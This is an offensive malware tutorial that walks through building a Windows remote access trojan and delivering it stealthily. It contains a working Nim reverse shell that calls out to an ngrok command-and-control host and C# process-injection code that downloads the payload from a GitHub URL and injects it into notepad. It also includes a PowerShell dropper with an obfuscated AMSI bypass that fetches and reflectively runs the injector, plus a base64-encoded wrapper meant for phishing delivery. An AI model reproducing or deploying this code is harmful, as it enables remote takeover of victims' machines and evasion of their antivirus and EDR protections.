# The Killchain - An Adversarial Malware Design Walkthrough

# Requirements

- Windows 10 the assumption being that this walkthrough was developed using Windows 10 and Window's Subsytem for Linux - Debian for the purposes of compiling our malware.
- Python version 3
- Powershell no specific version is needed however we want to simulate unhardened adversarial conditions so lets allow script execution.
- .NET Framework 6 I am using the dotnet cli utility for compiling our C# application since we only need one class.
- Any compiled programming language that can export applications as dynamic link libraries such as Go/C/C++/Nim
- sRDI: https://github.com/monoxgas/sRDI For generating position independent shellcode from our malicious DLL
- Linux: The one TRUE operating system, any Linux distro will do, including Windows Subsystem for Linux (This is optional)
- Ngrok: https://ngrok.com/  For port forwarding traffic between devices (This is optional)
- Metasploit for generating malicious DLL's with msfvenom, I won't cover this but you can apply the same tradecraft (This is optional)

# Goals

The purpose of this adversarial malware design walkthrough is to explore techniques for designing a malware that will grant remote access to a target while also attempting to bypass AV and EDR solutions.
This specific walkthrough makes use of the Reflective DLL Injection technique with some minor obfuscation to execute our malware entirely in memory without writing the dropper malware to disk. Here is a brief summary of the steps we need to take.
1. Design a simple remote access trojan that is not signatured by AV (Using this tradecraft you can substitute this for an advanced dropper)
2. Compile our trojan as a dynamic link library.
3. Modularizing our trojan by preparing it for reflective dll execution.
4. Deliver a malicious file to the target that will excute our malware in memory.

If we successfully execute the above techniques the only artifact on disk for forensics will be our poisoned file.
It is important to note that it will still be possible to inspect our malware using forensic tooling capable of dumping process memory.
Also consider the fact that if your malware executes attacks on other devices on the network this can lead to greater scrutiny of the infected device.

# Step 1: Designing the Trojan

For the sake of brevity our trojan will be a simple reverse shell created using the Nim programming language. Keep in mind that this technique is applicable to any software compiled as a dynamic link library. The trojan does need not be a reverse shell nor does it need to be written in Nim. I am using Nim because this is a simple proof of concept trojan. 
Nim is capable of compiling to C/C++/Objective C and even Javascript. 
You can also compile a Nim program for multiple different operating systems depending on the flags you pass to the compiler, however that is beyond the scope of this walkthrough. Lets take a look at our script reverse_shell.nim:

```
import net
import osproc   # For execCmdEx
import os


# My CC Server IP and Port
var ip = "2.tcp.ngrok.io"   # This can also be the IP Address of another device on your local network
var port = 11606            # see the repository reverse_shell.nim

# Create a new socket
var socket = newSocket()
var finalCommand : string
while true:
    try:
        socket.connect(ip, Port(port)) # Connect to CC Server
        # On a successful connection receive command from CC Server, execute command and send back result
        while true:
            try:
                socket.send("agent-x >")
                var command = socket.recvLine() # Read server command to be executed on target
                if command == "exit":
                    socket.send("Ending session for this client.")
                    socket.close()
                    system.quit(0)
                if system.hostOS == "windows":
                    finalCommand = "cmd /C" & command
                else:
                    finalCommand = "/bin/sh -c " & command
                var (cmdRes, _) = execCmdEx(finalCommand) # Executes final command and saves the result in cmdRes
                socket.send(cmdRes) # Send back the result to the CC Server
            except:
                socket.close()
                system.quit(0)
    except:
        echo "Connection failed, retrying in 5 seconds..."
        sleep(5000) # Waits 5 seconds
        continue

```
Notice that this implementation simply uses the standard socket library and assumes that you are forwarding the traffic through ngrok.
Everytime you start the Ngrok service you will be assigned a different IP address and Port, don't forget to update this in your own implementation.
The syntax of Nim is heavily influenced by python however you can do almost everything you could in C or C++ in Nim. It is also trivial to compile your tools for simple proof of concepts.

# Step 2: Compiling the Trojan as a Dynamic Link Library

Let's compile this script on our machine with the following compiler flags:

```
nim --os:windows --cpu:amd64 --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -d:release --hints:off --warnings:off -d:danger --app:lib -d:strip --opt:size --passc=-flto --passl=-flto c reverse_shell.nim
```
The reason why we are passing so many flags to the compiler is because we want to optimize the size of our trojan. In this example the flags of most note are --app:lib (This instructs the compiler to generate a DLL file instead of an executable), --opt:size (This instructs the compiler to optimize the size of the file) -d:danger (Only use this flag if you are certain your application works, this will decrease the size even more)
Remember under the hood the Nim compiler is translating your code into C and then generating a DLL from the intermediary C code. Once we have our reverse_shell.dll you may be surprised to see that the resulting binary is surprisingly small considering the fact that we have written this code in a language with a dynamic syntax, only about 300 kilobytes! This means that on the target our malware will have a very small memory footprint. 
If we were to use a Go based reverse shell, the memory footprint would be much larger because all Go binaries contain the Go runtime.  There are indeed some advantages to using Go. Because the size of the binaries are so large, some AV products won't scan your binary. 
It is also much more time consuming to analyze Go based malware because forensics teams need to sift through the Go runtime code as well as benign library code in order to identify your malicious code. 
This very fact has led to AV vendors accidently writing signatures for the Go runtime and flagging important software like Docker as malware accidently in the past.
Now that we have our trojan ready to go lets fire up our command and control center, which in this example will simply consist of netcat.
Please remember you can neglect to use Ngrok and set up a netcat listener on another device on the same network.
If you have ngrok installed please run the following command to start the service:

```
./ngrok tcp 4444
```

This instructs ngrok to forward all traffic to port 4444 on your local machine.
Fire up netcat with the following command:

```
nc -nlvp 4444
```

# Step 3: Modularizing our Trojan
Now that we have a dynamic link library and our c2 server setup in the background, lets convert our malware into a module so that we can reflectively inject it at runtime. For a general understanding of how reflective dll injection works please take a look at [this](https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection). 
There are several methods for executing this advanced technique but before we begin let's reason about the full process we will use to get our trojan to execute on our victim's device. 
First we want to deploy a malicious file to the target that will start a powershell process.  
The powershell process will then remotely load a C# based binary assembly into memory and use reflection to run the assembly. 
The C# assembly will handle actually executing our reverse_shell.dll in memory. 
In order for that last step to happen, our dll has to be accessible to our C# application as a compatible byte array. 
After our C# application has this byte array format of our reverse_shell.dll we will surrender control of the program to the shellcode we injected. 
To convert our dll into a usable byte array format for C# we will use the sRDI tool, clone it from this github repo:

```
git clone https://github.com/monoxgas/sRDI
```

After you have the repository cloned, navigate to the Python directory and copy over your reverse_shell.dll file into that same directory.
Next run the following command to generate a reverse_shell.bin file:

```
python ConvertToShellcode.py reverse_shell.dll
```

So why are we taking this step you ask? Well although we have a dll file if we are going to execute our malicious dll in memory, we need to have it in the format of position independent shellcode, the sRDI tool converts the dll into shellcode for us. Now that we have a binary format of our dll, we can convert it into a byte array format usable in C# by running the following command:

```
hexdump -v -e '1/1 "0x%02x,"' reverse_shell.bin | sed 's/.$//' > reverse_shell.txt
```

The shellcode byte array will be written into the reverse_shell.txt file. You could paste the shellcode in this file directly into your .NET application and your payload should fire when the application starts.
To try to make this a more advanced exploit we will develop the .NET application in such a way that it will load our shellcode into memory at runtime, that way it will be slightly harder for someone to reverse engineer your malware.
As you can see that it is very simple to modularize your payloads by following the above process. 
Also consider that this shellcode has not been obfuscated at all, and at least for now we don't need to since Nim binaries are as of not usually flagged by antivirus solutions...for now.  
The shellcode format generated in our reverse_shell.txt file is also usable in other languages such as Go. 
The final thing I would like to point out is that we have a great opportunity here to utilize some devops practices, this entire workflow is perfect for a CI/CD pipeline.

In order for us to execute our reverse_shell.dll at runtime with .NET, we will need to make use of system calls (syscalls).
By utilizing certain Windows APIs we can instruct the operating system to allocate memory for us, marshall our shellcode into that memory space, and subsuquently execute the shellcode.
It is important to realize that during this process our .NET program will not be able to identify some errors that are a result of your shellcode, you will need to extensively test your trojan prior to compiling to ensure it works properly at runtime.
If you are marshalling data back and forth between your shellcode and your .NET application, be very careful because things may silently fail or crash the .NET program.
This is especially true when returning strings from your shellcode to your .NET app.

We can use the kernel32.dll which exists on all windows machines to execute our low level systemcalls for loading our shellcode.
The APIs exported by the kernel32.dll will then call even lower level APIs located within the ntdll.dll.
The ntdll.dll sits on the edge of both user and kernel space. 
In the past AV and EDR solutions would hook into the kernel32.dll and inspect function calls located in that library. 
A typical bypass you could have used was to directly call APIs in ntdll.dll library, however nowadays AV vendors also hook ntdll.dll to identify suspicious behavior.
With sufficient obfuscation however, we should be able to avoid getting flagged by AV and EDR products.
In our C# application we will retrieve our shellcode as a byte array and execute a syscall to execute our payload as observed in Injection.cs example:

```c#
    public static byte[] maliciousDll = GetMaliciousDll("https://raw.githubusercontent.com/bakarilevy/TheKillchain/main/reverse_shell.json");

    public static byte[] GetMaliciousDll(string url) {
        using (var client = new HttpClient())
        using (HttpResponseMessage response = await client.GetAsync(url))
        {
            byte[] maliciousDll = await response.Content.ReadAsByteArrayAsync();
        }
        return maliousDll;
    }

```

In this snippet we can see that our C# application is able to remotely load our Nim DLL into memory from a remote repository, this can of course be changed very easily so that we can host our reverse shell on another platform.

```c#
    [DllImport("Kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("Kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("Kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("Kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("Kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);
``` 

In this snippet you can see that we are exporting the necessary functions from kernel32.dll we need to carry out the Reflective DLL Injection.
We are using .NET's Platform Invoke (P/Invoke) APIs in order to call our shellcode.
Code written in C# is converted into an intermediate bytecode and consumed by the .NET Common Language Runtime.
Our shellcode however is considered "unmanaged code" by the .NET Runtime because it is compiled directly to native code.
You will see later why we choose to utilize this method for loading our trojan malware into memory.

```c#
public enum ProcessAccessRights
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }

    public enum MemAllocation
    {
        MEM_COMMIT = 0x00001000,
        MEM_RESERVE = 0x00002000,
        MEM_RESET = 0x00080000,
        MEM_RESET_UNDO = 0x1000000,
        SecCommit = 0x08000000
    }

    public enum MemProtect
    {
        PAGE_EXECUTE = 0x10,
        PAGE_EXECUTE_READ = 0x20,
        PAGE_EXECUTE_READWRITE = 0x40,
        PAGE_EXECUTE_WRITECOPY = 0x80,
        PAGE_NOACCESS = 0x01,
        PAGE_READONLY = 0x02,
        PAGE_READWRITE = 0x04,
        PAGE_WRITECOPY = 0x08,
        PAGE_TARGETS_INVALID = 0x40000000,
        PAGE_TARGETS_NO_UPDATE = 0x40000000,
    }
```

Here we are specifying the numerous flags we may require for invoking the APIs in the kernel32.dll. We can use these flags to do things such as setting the permissions on the memory segments that we allocate.

```c#
    public static int SearchForTargetID(string process)
    {
            int pid = 0;
            int session = Process.GetCurrentProcess().SessionId;
            Process[] allprocess = Process.GetProcessesByName(process);

            try
            {
                foreach (Process proc in allprocess)
                {
                    if (proc.SessionId == session)
                {
                    pid = proc.Id;
                    Console.WriteLine("[+] Target process ID found: " + pid);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[+] " + Marshal.GetExceptionCode());
            Console.WriteLine(ex.Message);
        }
        return pid;
    }
```
We can see that this function is used to identify the process id for a specific program we will attempt to inject our shellcode into.
It is very important to remember that we can only inject our shellcode into a process we have the correct permissions for.

```c#
    public static void ReflectiveDLLInject(int targetId, byte[] buffer)
        {
            try
            {
                IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
                IntPtr lpThreadId = IntPtr.Zero;


                IntPtr procHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)targetId);
                Console.WriteLine("[+] Getting the handle for the target process: " + procHandle);
                IntPtr remoteAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)buffer.Length, (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                Console.WriteLine("[+] Allocating memory in the remote process " + remoteAddr);
                Console.WriteLine("[+] Writing shellcode at the allocated memory location.");
                if (WriteProcessMemory(procHandle, remoteAddr, buffer, (uint)buffer.Length, out lpNumberOfBytesWritten))
                {
                    Console.WriteLine("[+] Shellcode written in the remote process.");
                    CreateRemoteThread(procHandle, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out lpThreadId);
                }
                else
                {
                    Console.WriteLine("[+] Failed to inject shellcode.");
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }
```
In our ReflectiveDLLInject function is where the actual injection happens, you can see that we are simply calling the exported functions that are located in the kernel32.dll.
This is a place where you can do further experimentation, such as changing the permission flags you pass for the memory protections, such as MemProtect.PAGE_EXECUTE_READWRITE.

```c#
public static void Main(string[] args) {

        Console.WriteLine("Executing Reflective Dll Injection...");
        string targetProccess = "notepad";
        int targetProccessId = SearchForTargetID(targetProccess);
        ReflectiveDLLInject(targetProccessId, maliciousDll);
        
    }
```

Of course in our Main function, we simply attempt to identify a running notepad process and inject into it. We could alternatively attempt to spawn a process manually using .NET and inject into it however, that may not be as stealthy as injecting into an already running process.

When researching this technique you may wonder why we are using the VirtualAllocEx WindowsAPI function instead of the VirtualAlloc function.
We use VirtualAllocEx because we are allocating memory in another process' address space, if we were not doing this we could use VirtualAlloc.

We can compile this C# program into a .NET assembly using the following command:

```
dotnet build
```

Now that we have a C# .NET binary that will load our trojan into memory, you may wonder how we will deliver it to our target.
It's not like you could easily convince an end user to click on an unsigned binary in your phishing campaign.
Well it's simple, we will use Powershell to execute our .NET binary, if you recall earlier, I mentioned that .NET applications are compiled into bytecode that is consumed by the .NET Common Language Runtime. 
Powershell is actually a thin scripting layer over .NET's System.Management.Automation API, which means that it can also consume .NET bytecode (referred to as .NET Assemblies) and execute them in memory!

The process for doing this is very simple and works with any .NET Assembly:

```ps1
$path = "C:\path\to\my\assembly\MyProgram.exe"
$bytes = [System.IO.File]::ReadAllBytes($path)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entryPointMethod.Invoke($null, (, [string[]] ($null)))
```

In the above example you can see that directly within powershell we can load our .NET assembly here named "MyProgram.exe"
We then read the bytes of the assembly and load it into memory, then we use .NET's reflection API to call the Main method of our .NET application.
Keep in mind that you can compile your .NET application as a DLL but do not get confused, you can still use Powershell to execute the .NET DLLs in this exact same way.
Remember the reverse_shell that we developed in Nim is NOT managed code from the .NET runtime perspective, that is why we must use the .NET P/Invoke APIs in kernel32.dll to call the unmanaged code that we developed in Nim.

We will execute a web request from our Powershell script to load our Injection.exe application into memory from a static repository and reflectively execute it on our target machine.
It should be clear that one mistake made on behalf of the user can lead to a very serious and stealthy malware executing in the background.
One more precaution we can take to increase the chances of our malware establishing a foothold on the target is to first try to patch AMSI before we attempt to load any of our more sophisticated malware on the target.

If you are unfamiliar, Microsoft's Anti Malware Scan Interface (AMSI) is a protection mechanism added to assist in the detection of malware, you can read more about it [here](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal). 
AMSI also exposes hooks so that AV and EDR solutions can make use of it to augmuent their functionality.
In this example we will make use of Matt Graeber's ever popular AMSI Initalization Fail to patch AMSI out of the running Powershell process before we retrieve our other malware.
This leaves us with the final version of our Dropper.ps1:

```ps1
$k = $("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result);
$w = $("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result).Substring(9,14);
[Ref].Assembly.GetType('System.Management.Automation.' + $k).GetField($w, 'NonPublic,Static').SetValue($null, $true);
$path = (Invoke-WebRequest 'https://github.com/bakarilevy/killchain/Injection.exe').Content;
$bytes = [System.IO.File]::ReadAllBytes($path);
$assembly = [System.Reflection.Assembly]::Load($bytes);
$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
$entryPointMethod.Invoke($null, (, [string[]] ($null)));
```

The astute amongst you will notice that this is not an acceptable script to deploy to our target because it contains data about where some of our artifacts are stored.
Luckily we can make this dropper more stealthy by base64 encoding it before we deliver it to our target have a look at Stealth.ps1:

```ps1
$k = "JGsgPSAkKCI0MSA2RCA3MyA2OSA1NSA3NCA2OSA2QyA3MyIuU3BsaXQoIiAiKXxmb3JFYWNoe1tjaGFy..."
$w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($k))
echo $w -nop -windowstyle hidden -
``` 

Please note that I have not included the entire base64 string in the above example due to it's size however it is in the source code.
As you can see we have taken our Dropper.ps1 script and obfuscated it as a string, we will then unpack it at runtime and execute it.
The final step in our killchain is simply to generate a malicious file that will retrieve and execute our Stealth.ps1 script in memory.

# Resources
- https://github.com/byt3bl33d3r/OffensiveNim - Excellent Proof Of Concept scripts for Nim based malware
- https://inv.riverside.rocks/watch?v=gH9qyHVc9-M - Excellent explanation of several techniques for executing Shellcode using Go
- https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/ - An excellent explanation of how AMSI works and common bypasses
- https://github.com/stephenfewer/ReflectiveDLLInjection - Author of the Reflective DLL Injection technique
- https://www.pinvoke.net/index.aspx - Handy reference of .NET P/Invoke function signatures
- https://github.com/r3nhat/XORedReflectiveDLL - Template of our Injection.cs class, slightly modified for our use cases